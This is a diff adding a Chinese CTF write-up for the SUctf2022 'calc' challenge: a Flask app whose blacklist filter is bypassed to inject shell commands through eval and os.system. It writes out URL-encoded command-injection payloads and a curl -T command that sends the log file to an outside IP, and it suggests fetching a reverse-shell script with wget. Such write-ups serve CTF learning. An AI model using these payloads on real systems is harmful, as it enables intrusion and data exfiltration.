@@ -569,3 +569,86 @@ O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%
 
 
 
+### calc（赛后）
+
+```python
+#coding=utf-8
+from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
+import random
+from urllib import parse
+import os
+from werkzeug.utils import secure_filename
+import time
+
+
+app=Flask(__name__)
+
+def waf(s):
+    blacklist = ['import','(',')',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
+    flag = True
+    for no in blacklist:
+        if no.lower() in s.lower():
+            flag= False
+            print(no)
+            break
+    return flag
+    
+
+@app.route("/")
+def index():
+    "欢迎来到SUctf2022"
+    return render_template("index.html")
+
+@app.route("/calc",methods=['GET'])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get("num")
+    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)
+    
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return "waf!!"
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0',port=5000)  
+
+```
+
+关键看
+
+```python
+data = eval(num)
+os.system(log)
+```
+
+需要eval计算不报错，才能利用os.system来执行命令，用`#`注释掉就行
+
+然后就是类似无回显rce，可以考虑curl到vps：
+
+```
+url/calc?num=123%23`curl%09ip:8899`
+```
+
+不过当时想不出咋带，后面学习了一下curl的用法
+
+可以看看这篇：[绕过限制利用curl读取写入文件](https://www.anquanke.com/post/id/98896)
+
+因为结果会被写入到/tmp/log.txt，可以利用curl -T带出来
+
+```
+url/calc?num=123%23`ls%09/`
+
+url/calc?num=123%23`cat%09/Th1*`
+
+http://a3083104-9be8-438f-9984-d62af926a2a8.node4.buuoj.cn:81/calc?num=123%23`curl%09-T%09/tmp/log.txt%09119.3.217.40:8899`
+```
+
+![](https://s2.loli.net/2022/04/18/falSeBvE9MzZjOn.png)
+
+也可以考虑wget一个反弹shell的sh文件然后执行，注意要放到可写目录
